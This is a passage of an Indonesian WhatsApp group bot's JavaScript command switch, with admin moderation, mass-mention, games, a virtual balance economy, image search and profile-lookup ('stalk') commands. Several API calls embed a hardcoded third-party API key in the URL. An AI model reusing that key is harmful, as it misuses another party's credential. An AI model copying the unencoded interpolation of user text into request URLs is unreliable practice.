if (!isCreator && !isAdmins) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await juna.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply('Sukses promote member✅')).catch((err) => m.reply('❌ Terjadi kesalahan'))
}
break
case 'demote': case 'dm': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await juna.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply('Sukses demote admin✅')).catch((err) => m.reply('❌ Terjadi kesalahan'))
}
break
case'revoke':
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
addCountCmd('revoke', m.sender, _cmd)
await juna.groupRevokeInvite(m.chat)
.then( res => {
m.reply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => m.reply(mess.error.api))
break
case 'tagall': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return m.reply ('Lu Siapa?') 
if (!isBotAdmins) return m.reply ('Bot Harus Jad Admin!') 
let teks = `*👥 Tag All By Admin*
 
🗞️ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `• @${mem.id.split('@')[0]}\n`
}
juna.sendMessage(m.chat, {
text: teks,
mentions: participants.map(a => a.id)
}, {
quoted: m
})
}
break
case 'hidetag': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return m.reply('Lu siapa kocak?')
juna.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: fkontak })
}
break
case 'delete': case 'd': case 'del': {
if (!m.quoted) throw false
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await juna.sendMessage(m.chat, { delete: { remoteJid: m.chat, id: m.quoted.id, participant: m.quoted.sender } })
}
break
case 'checksewa': case'ceksewa': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isSewa) return m.reply(`Bot tidak di sewa group ini!`)
addCountCmd('checksewa', m.sender, _cmd)
let ceksewa = ms(_sewa.getSewaExpired(m.chat, sewa) - Date.now())
let sewanya = `*Expire :* ${ceksewa.days} day(s) ${ceksewa.hours} hour(s) ${ceksewa.minutes} minute(s)`
m.reply(sewanya)
}
break
// Game Menu
case 'ttc': case 'ttt': case 'tictactoe': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
let TicTacToe = require("./lib/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return m.reply( 'Kamu masih didalam game')
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
m.reply('Partner ditemukan!')
room.o = m.chat
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if (room.x !== room.o) await juna.sendText(room.x, str, m, { mentions: parseMention(str) } )
await juna.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: m.chat,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${prefix+command} ${text}` : ''))
this.game[room.id] = room
}
}
break
case 'delttc': case 'delttt': {
let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
if (!roomnya) return m.reply ( `Kamu sedang tidak berada di room tictactoe !`)
delete this.game[roomnya.id]
m.reply(`Berhasil delete session room tictactoe !`)
}
break
case 'suitpvp': case 'suit': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @0`, m.chat, { mentions: '0@s.whatsapp.net' })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return m.reply(`Orang yang kamu tantang sedang bermain suit bersama orang lain`)
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await m.reply(caption),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) m.reply(`_Waktu suit habis_`)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break
case'casino':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (isGame(m.sender, isCreator, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (!text) return m.reply(`Kirim perintah *${prefix+command}* @tag nominal`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (fs.existsSync(`./database/${m.chat}.json`)) return m.reply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\nKetik *${prefix}delcasino*, untuk menghapus sesi`)
if (!args[1]) return m.reply('Masukan Nominal Nya')
if (args[1].includes('-')) return m.reply(`Jangan menggunakan -`)
if (isNaN(parseInt(args[1]))) return m.reply('Nominal Harus Berupa Angka!')
var anu = getBalance(m.sender, balance)
var ani = getBalance(m.mentionedJid[0], balance)
if (anu < args[1] || anu == 'undefined') return m.reply(`Balance Tidak Mencukupi, Kumpulkan Terlebih Dahulu\nKetik ${prefix}balance, untuk mengecek Balance mu!`)
if (ani < args[1] || ani == 'undefined') return m.reply(`Balance Lawan Tidak Mencukupi Untuk Bermain Denganmu\nKetik ${prefix}balance @tag untuk mengecek Balance lawanmu`)
var casinoo = setCasino(`${m.chat}`)
casinoo.Z = m.sender.replace("@s.whatsapp.net", "")
casinoo.Y = users
casinoo.nominal = parseInt(args[1])
addCountCmd('casino', m.sender, _cmd)
fs.writeFileSync(`./database/casino/${m.chat}.json`, JSON.stringify(casinoo, null, 2))
if (!isCreator && !isPremium) { gameAdd(m.sender, glimit) }
var starGame = `🎰 Memulai Game Casino 💰\n\n• @${m.sender.replace("@s.whatsapp.net", "")} Menantang ${text}, dengan Nominal: *$ ${parseInt(args[1])}*\n• Ketik Y/N untuk menerima atau menolak Permainan!`
juna.sendMessage(m.chat, { text: starGame, mentions: [m.sender, users] }, { quoted: m })
}
 break
case'delcasino':
if (fs.existsSync('./database/casino/'+m.chat+'.json')) {
var csn = JSON.parse(fs.readFileSync('./database/casino/'+m.chat+'.json'))
if (csn.Z.includes(m.sender)) {
addCountCmd('delcasino', m.sender, _cmd)
deleteCasino(m.chat)
m.reply('Berhasil Menghapus Sesi Casino')
} else if (csn.Y.includes(m.sender)) {
addCountCmd('delcasino', m.sender, _cmd)
deleteCasino(m.chat)
m.reply('Berhasil Menghapus Sesi Casino')
} else if (isAdmins) {
addCountCmd('delcasino', m.sender, _cmd)
deleteCasino(m.chat)
m.reply('Berhasil Menghapus Sesi Casino')
} else if (isCreator) {
addCountCmd('delcasino', m.sender, _cmd)
deleteCasino(m.chat)
m.reply('Berhasil Menghapus Sesi Casino')
} else {
m.reply('Anda tidak bisa menghapus sesi casino, karena bukan pemain!')
}
} else {
m.reply('Tidak ada sesi yang berlangsung')
}
break
// Search Menu
case'lirik': case 'liriklagu':
try {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *judul*\n\n_Contoh_\n\n${prefix+command} Bila Nanti`)
let result = await fetchJson(`https://api.lolhuman.xyz/api/lirik?apikey=GataDios&query=${text}`)
m.reply(`*Judul* : ${text}\n*Lirik* : ${result.result}`)
} catch (err) {
console.log(err)
m.reply('Terjadi Kesalahan')
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case'grupwa': case'searchgrup':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *nama group*\n\n_Contoh_\n\n${prefix+command} store`)
m.reply(mess.wait)
addCountCmd('grupwa', m.sender, _cmd)
hxz.linkwa(q).then(async(data) => {
if (data.length == 0) return m.reply(`Grup ${q} tidak ditemukan`)
var teks = `*Hasil Pencarian Dari ${q}*\n\n`
for (let x of data) {
teks += `*Nama : ${x.nama}\n*Link :* ${x.link}\n\n`
}
m.reply(teks)
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}).catch((e) => {
console.log(color('[ ERROR ]', 'red'), e)
m.reply(`Hasil pencarian dari ${q} tidak ditemukan`)

})
break
case 'ffstalk': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return m.reply(`Contoh: ${prefix+command} id`)
if (isNaN(text)) return m.reply(`ID harus berupa angka!`)
m.reply(mess.wait)
try {
let epep = await fetchJson(`https://api.lolhuman.xyz/api/freefire/${text}?apikey=GataDios`)
m.reply(`Id : ${text}
Nickname : ${epep.result}`)
} catch (err) {
m.reply(mess.error.slh)
}
}
break
case 'mlstalk': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return m.reply(`Contoh: ${prefix+command} id|server`)
if (isNaN(q.split("|")[0])) return m.reply(`ID harus berupa angka!`)
if (isNaN(q.split("|")[1])) return m.reply(`ID Zone harus berupa angka!`)
m.reply(mess.wait)
try {
let emel = await fetchJson(`https://api.lolhuman.xyz/api/mobilelegend/${q.split("|")[0]}/${q.split("|")[1]}?apikey=GataDios`)
m.reply(`ID : ${q.split("|")[0]}
ID Zone : ${q.split("|")[1]}
Nickname : ${emel.result}`)
} catch (err) {
m.reply(mess.error.slh)
}
}
break
case 'igstalk':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return m.reply(`Contoh: ${prefix+command} nickname`)
m.reply(mess.wait)
try {
let ani = await fetchJson(`https://aemt.me/download/igstalk?username=${q}`)
let anu = ani.result.user_info
const nick = anu.username
const nama = anu.full_name
const post = anu.posts
const foll = anu.followers
const foli = anu.following
const bio = anu.biography
juna.sendMessage(m.chat, { image: { url: anu.profile_pic_url}, caption: `Nickname : ${nick}\nFullname : ${nama}\nPostingan : ${post}\nFollowers : ${foll}\nFollowing : ${foli}\nBio : ${bio}`}, {quoted: m})
} catch (err) {
m.reply(mess.error.slh)
}
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'gimage': case 'gi':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
//if (m.isGroup) return m.reply('Untuk menghindari spam, fitur ini di setting hanya untuk private chat!')
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *text*\n\n_Contoh_\n\n${prefix+command} Anime`)
m.reply(`*Mencari Gambar...*`)
try {
let ano = await fetchJson(`https://aemt.me/googleimage?query=${text}`)
let anu = ano.result
let result = anu[Math.floor(Math.random() * anu.length)]
juna.sendMessage(m.chat, { image: { url: result }, caption: 'Done kak'}, { quoted: m })
} catch (err) {
m.reply(mess.error.slh)
}
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'pinterest': case 'pin':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
//if (m.isGroup) return m.reply('Untuk menghindari spam, fitur ini di setting hanya untuk private chat!')
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *text*\n\n_Contoh_\n\n${prefix+command} Anime`)
m.reply(`*Mencari Gambar...*`)
try {
let anu = await pinterest(text)
let result = anu[Math.floor(Math.random() * anu.length)]
juna.sendMessage(m.chat, { image: { url: result }, caption: 'Done kak'}, { quoted: m })
} catch (err) {
m.reply(mess.error.slh)
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
case 'yts': case 'ytsearch':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) m.reply(`Gunakan dengan cara ${prefix+command} *text*\n\n_Contoh_\n\n${prefix+command} Cara membuat bot WhatsApp`)
let reso = await yts(`${text}`)
let aramat = reso.all
var tbuff = await getBuffer(aramat[0].image)
let teks = aramat.map(v => {
switch (v.type) {
case 'video': return `
📛 Title : *${v.title}* 
⏰ Durasi: ${v.timestamp}
🚀 Diupload ${v.ago}
😎 Views : ${v.views}
🌀 Url : ${v.url}
`.trim()
case 'channel': return `
📛 Channel : *${v.name}*
🌀 Url : ${v.url}
👻 Subscriber : ${v.subCountLabel} (${v.subCount})
🎦 Total Video : ${v.videoCount}
`.trim()
}
}).filter(v => v).join('\n----------------------------------------\n')

juna.sendMessage(m.chat, { image: tbuff, caption: teks }, { quoted: m })

 .catch((err) => {
m.reply("Not found")
})
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break

 // Random Menu
 case'cecan':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
m.reply(mess.wait)
addCountCmd('cecan', m.sender, _cmd)
var query = ["cewe korea","cewe china", "cewe Thailand"]
let datax = await pinterest(query[Math.floor(Math.random() * query.length)])
let anu = datax[Math.floor(Math.random() * datax.length)]
juna.sendMessage(m.chat, { caption: "Random Cecan", image: { url: anu }}, { quoted: m })
.catch((e) => {
m.reply(mess.error.api)

})
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
case "cosplay": {
if (!isCreator&&!isPremium) return m.reply(mess.OnlyPrem)
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await fetchJson("https://raw.githubusercontent.com/Yahyaalmuthahar/database/main/cosplay.json")
m.reply(mess.wait)
let random = anu[Math.floor(Math.random() * anu.length)]
juna.sendMessage(m.chat,{image: {url: random },caption: `Cosplay ✅`,},{quoted: m,})
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case'cogan':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
m.reply(mess.wait)
addCountCmd('cogan', m.sender, _cmd)
var query = ["cowo korea","cowo china", "cowo Thailand"]
let datax = await pinterest(query[Math.floor(Math.random() * query.length)])
let anu = datax[Math.floor(Math.random() * datax.length)]
juna.sendMessage(m.chat, { caption: "Random Cogan", image: { url: anu }}, { quoted: m })
.catch((e) => {
m.reply(mess.error.api)

})
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
case'waifu':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (m.isGroup) return m.reply('Untuk menghindari spam, fitur ini di setting hanya untuk private chat!')
m.reply(mess.wait)
addCountCmd('waifu', m.sender, _cmd)
var data = (await axios.get('https://waifu.pics/api/sfw/waifu')).data.url
juna.sendMessage(m.chat, { caption: "Random Waifu", image: { url: data }}, { quoted: m })
.catch((e) => {
console.log(color('[ ERROR ]', 'red'), e)
m.reply(mess.error.api)

})
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
// Balance Menu
case 'topglobal':{
if (!m.isGroup)return m.reply(mess.OnlyGrup)
balance.sort((a, b) => (a.balance < b.balance) ? 1 : -1)
top = `*▢━━「 🏆 TIGA BESAR 」━━▢*\n\n🥇 @${balance[0].id.split("@")[0]}\n*=> Balance* : Rp ${balance[0].balance}\n\n🥈 @${balance[1].id.split("@")[0]}\n*=> Balance* : Rp ${balance[1].balance}\n\n🥉 @${balance[2].id.split("@")[0]}\n*=> Balance* : Rp ${balance[2].balance}\n\n\n*▢━━「 TOPGLOBAL ALL 」━━▢*\n\n`
let arrTop = []
var total = 10
if (balance.length < 10) total = balance.length
for (let i = 0; i < total; i ++){
var leveloler = getBalance(balance[i].id, balance)
var oler = 'Bronze 1'
if (leveloler <= 2) {
oler = 'Bronze 1'
} else if (leveloler <= 250) {
oler = 'Bronze 2'
} else if (leveloler <= 300) {
oler = 'Bronze 3'
} else if (leveloler <= 1000) {
oler = 'Silver 1'
} else if (leveloler <= 2000) {
oler = 'Silver 2'
} else if (leveloler <= 3000) {
oler = 'Silver 3'
} else if (leveloler <= 5000) {
oler = 'Gold 1'
} else if (leveloler <= 6000) {
oler = 'Gold 2'
} else if (leveloler <= 7000) {
oler = 'Gold 3'
} else if (leveloler <= 9000) {
oler = 'Platinum 1'
} else if (leveloler <= 10000) {
oler = 'Platinum 2'
} else if (leveloler <= 11000) {
oler = 'Platinum 3'
} else if (leveloler <= 12000) {
oler = 'Platinum 4'
} else if (leveloler <= 13000) {
oler = 'Platinum 5'
} else if (leveloler <= 16000) {
oler = 'Diamond 1'
} else if (leveloler <= 17000) {
oler = 'Diamond 2'
} else if (leveloler <= 18000) {
oler = 'Diamond 3'
} else if (leveloler <= 19000) {
oler = 'Diamond 4'
} else if (leveloler <= 20000) {
oler = 'Diamond 5'
} else if (leveloler <= 30000) {
oler = 'Master'
} else if (leveloler <= 40000) {
oler = 'Master ✩'
} else if (leveloler <= 50000) {
oler = 'Master ✩✩'
} else if (leveloler <= 60000) {
oler = 'Master ✩✩✩'
} else if (leveloler <= 70000) {
oler = 'Master ✯'
} else if (leveloler <= 80000) {
oler = 'Master ✯✯'
} else if (leveloler <= 100000) {
oler = 'Master ✯✯✯'
} else if (leveloler <= 110000) {
oler = 'GrandMaster'
} else if (leveloler <= 120000) {
oler = 'GrandMaster ✩'
} else if (leveloler <= 130000) {
oler = 'GrandMaster ✩✩'
} else if (leveloler <= 140000) {
oler = 'GrandMaster ✩✩✩'
} else if (leveloler <= 150000) {
oler = 'GrandMaster ✯'
} else if (leveloler <= 160000) {
oler = 'GrandMaster ✯✯'
} else if (leveloler <= 170000) {
oler = 'GrandMaster ✯✯✯'
} else if (leveloler <= 210000000) {
oler = 'KING SEPUHHH 숒'
} else if (leveloler <= 10000000000) {
oler = 'OWNER 🤖'
}
top += `${i + 1}. @${balance[i].id.split("@")[0]}\n*=> Balance* : Rp ${balance[i].balance}\n*=> Pangkat* : ${oler}\n\n`
arrTop.push(balance[i].id)
}
juna.sendTextWithMentions(m.chat, top, m)
//mentions(top, arrTop, true)
}
break
case'toplocal':{
if (!m.isGroup)return m.reply(mess.OnlyGrup)
balance.sort((a, b) => (a.balance < b.balance) ? 1 : -1)
let top = '*── 「 TOPLOCAL BALANCE 」 ──*\n\n'
let arrTop = []
var total = 10
if (balance.length < 10) total = balance.length
let anggroup = groupMembers.map(a => a.id)
for (let i = 0; i < total; i ++){
if (anggroup.includes(balance[i].id)) {
top += `${i + 1}. @${balance[i].id.split("@")[0]}\n=> Balance : Rp ${balance[i].balance}\n\n`
arrTop.push(balance[i].id)
}
}
juna.sendTextWithMentions(m.chat, top, m)
}
break
case'buylimit':{
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *jumlah limit yang ingin dibeli*\n\nHarga 1 limit = Rp 250 balance\n\n*Contoh:*\n.buylimit 10`)
if (text.includes('-')) return m.reply(`Jangan menggunakan -`)
if (isNaN(text)) return m.reply(`Harus berupa angka`)
if (args[0] === 'infinity') return m.reply(`Yahaha saya ndak bisa di tipu`)
let ane = Number(parseInt(text) * 250)
if (getBalance(m.sender, balance) < ane) return m.reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
addCountCmd('buylimit', m.sender, _cmd)
kurangBalance(m.sender, ane, balance)
giveLimit(m.sender, parseInt(text), limit)
m.reply(`Pembeliaan limit sebanyak ${text} berhasil\n\nSisa Balance : Rp ${getBalance(m.sender, balance)}\nSisa Limit : ${getLimit(m.sender, limitCount, limit)}`)
}
break
case'buygamelimit': case'buyglimit':{
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *jumlah game limit yang ingin dibeli*\n\nHarga 1 game limit = Rp 250 balance\n*Contoh:*\n.buyglimit 10`)
if (text.includes('-')) return m.reply(`Jangan menggunakan -`)
if (isNaN(text)) return m.reply(`Harus berupa angka`)
if (text === 'infinity') return m.reply(`Yahaha saya ndak bisa di tipu`)
let ane = Number(parseInt(text) * 250)
if (getBalance(m.sender, balance) < ane) return m.reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
addCountCmd('buygamelimit', m.sender, _cmd)
kurangBalance(m.sender, ane, balance)
givegame(m.sender, parseInt(text), glimit)
m.reply(`Pembeliaan game limit sebanyak ${text} berhasil\n\nSisa Balance : Rp ${getBalance(m.sender, balance)}\nSisa Game Limit : ${cekGLimit(m.sender, gcount, glimit)}`)
}
break
case 'ttstalk': case 'tiktokstalk': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return m.reply(`Contoh: ${prefix+command} nickname`)
m.reply(mess.wait)
try {
const { TiktokStalk } = require("@tobyg74/tiktok-api-dl")

TiktokStalk(text).then((result) => {
juna.sendMessage(m.chat, { image: { url: result.result.users.avatarThumb }, caption: `Nickname : ${result.result.users.nickname}\nUsername : ${result.result.users.username}\nPostingan : ${result.result.stats.videoCount}\nFollowers : ${result.result.stats.followerCount}\nFollowing : ${result.result.stats.followingCount}\nFriends : ${result.result.stats.friendCount}\nBio : ${result.result.users.signature}`}, {quoted: m})
})
} catch (err) {
m.reply(mess.error.slh)
}
}
break
case'transfer': case'tf':{
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *@tag nominal*\n\nContoh : ${prefix+command} @6285600793871 2000`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!users) return m.reply(`Tag orang yang ingin di transfer balance\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (!args[1]) return m.reply(`Masukkan nominal nya!\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (isNaN(args[1])) return m.reply(`Nominal harus berupa angka!\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (args[1] === 'infinity') return m.reply(`Yahaha saya ndak bisa di tipu`)
if (args[1].includes("-")) return m.reply(`Jangan menggunakan -\n\nContoh : ${prefix+command} @6285600793871 2000`)
var anu = getBalance(m.sender, balance)
if (anu < args[1] || anu == 'undefined') return m.reply(`Balance Kamu Tidak Mencukupi Untuk Transfer Sebesar Rp ${args[1]}, Kumpulkan Terlebih Dahulu\nKetik ${prefix}balance, untuk mengecek Balance mu!`)
addCountCmd('transfer', m.sender, _cmd)
kurangBalance(m.sender, parseInt(args[1]), balance)
addBalance(users, parseInt(args[1]), balance)
juna.sendTextWithMentions(m.chat, `Sukses transfer balance sebesar ${args[1]} kepada @${users.split("@")[0]}`, m)
}
break
case 'register': case 'daftar': {
if (isUser) return m.reply(`Anda Telah Terdaftar!!`)
var angka = await randomNomor(1000, 9999)
addCode(m.sender, angka, daftar)
m.reply(`Kode keamanan (OTP) untuk verifikasi sudah dikirimkan melalui PM. Silahkan cek PM kamu.\n\nSilahkan ketik KODE OTP disini`)
await sleep(3000)
let mycod = await getCode(m.sender, daftar)
await juna.sendMessage(m.sender, {text: `[#] *${mycod}* adalah kode verifikasi Anda. Gunakan kode ini untuk verifikasi.`}, {quoted: fkontak})
}
break
case 'mingguan': {
if (isMingguan) {
let cekming = ms(_mingguan.getMingguanExpired(m.sender, mingguan) - Date.now())
 m.reply(`Kamu Sudah Mengambilnya Minggu Ini\nTunggu Selama ${cekming.days} Hari ${cekming.hours} Jam ${cekming.minutes} Menit Lagi`)
}
if (!isMingguan) {
let bal = 7000
let lim = 10
let wak = '7d'
addBalance(m.sender, parseInt(bal), balance)
giveLimit(m.sender, parseInt(lim), limit)
 m.reply(`Selamat Kamu Mendapatkan:\n\n*+ Rp 7000 Balance*\n*+ 10 Limit*`)
_mingguan.addMingguanUser(m.sender, wak, mingguan)
}
}
break
case 'bulanan': {
if (isBulanan) {
let cekming = ms(_bulanan.getBulananExpired(m.sender, bulanan) - Date.now())
 m.reply(`Kamu Sudah Mengambilnya Bulan Ini\nTunggu Selama ${cekming.days} Hari ${cekming.hours} Jam ${cekming.minutes} Menit Lagi`)
}
if (!isBulanan) {
let bal = 7000
let lim = 10
let wak = '30d'
addBalance(m.sender, parseInt(bal), balance)
giveLimit(m.sender, parseInt(lim), limit)
 m.reply(`Selamat Kamu Mendapatkan:\n\n*+ Rp 7000 Balance*\n*+ 10 Limit*`)
_bulanan.addBulananUser(m.sender, wak, bulanan)
}
}
break
case'adduang': case'addbalance': case'addbal': {
if (!isCreator) return m.reply('Lu Siapa Kocak?')
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *@tag nominal*\n\nContoh : ${prefix+command} @6285600793871 2000`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!users) return m.reply(`Tag orang yang ingin di top up balance\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (!args[1]) return m.reply(`Masukkan nominal nya!\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (isNaN(args[1])) return m.reply(`Nominal harus berupa angka!\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (args[1] === 'infinity') return m.reply(`Yahaha saya ndak bisa di tipu`)
if (args[1].includes("-")) return m.reply(`Jangan menggunakan -\n\nContoh : ${prefix+command} @6285600793871 2000`)
addCountCmd('transfer', m.sender, _cmd)
addBalance(users, parseInt(args[1]), balance)
juna.sendTextWithMentions(m.chat, `Sukses top up balance sebesar ${args[1]} kepada @${users.split("@")[0]}`, m)
}
break
case'kuruang': case'kurbalance': case'kurbal': {
if (!isCreator) return m.reply('Lu Siapa Kocak?')
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *@tag nominal*\n\nContoh : ${prefix+command} @6285600793871 2000`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!users) return m.reply(`Tag orang yang ingin di kurang balance\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (!args[1]) return m.reply(`Masukkan nominal nya!\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (isNaN(args[1])) return m.reply(`Nominal harus berupa angka!\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (args[1] === 'infinity') return m.reply(`Yahaha saya ndak bisa di tipu`)
if (args[1].includes("-")) return m.reply(`Jangan menggunakan -\n\nContoh : ${prefix+command} @6285600793871 2000`)
var anu = getBalance(users, balance)
if (anu < args[1] || anu == 'undefined') return m.reply(`Balance @${users.split("@")[0]} Tidak Mencukupi Untuk Dikurang Sebesar Rp ${args[1]}\nKetik ${prefix}balance @${users.split("@")[0]}, untuk mengecek Balance target!`)
addCountCmd('transfer', m.sender, _cmd)
kurangBalance(users, parseInt(args[1]), balance)
juna.sendTextWithMentions(m.chat, `Sukses kurang balance sebesar ${args[1]} dari @${users.split("@")[0]}`, m)
}
break
case'addlimit': {
if (!isCreator) return m.reply('Lu Siapa Kocak?')
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *@tag nominal*\n\nContoh : ${prefix+command} @6285600793871 2000`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!users) return m.reply(`Tag orang yang ingin di top up limit\n\nContoh : ${prefix+command} @6285600793871 2000`)
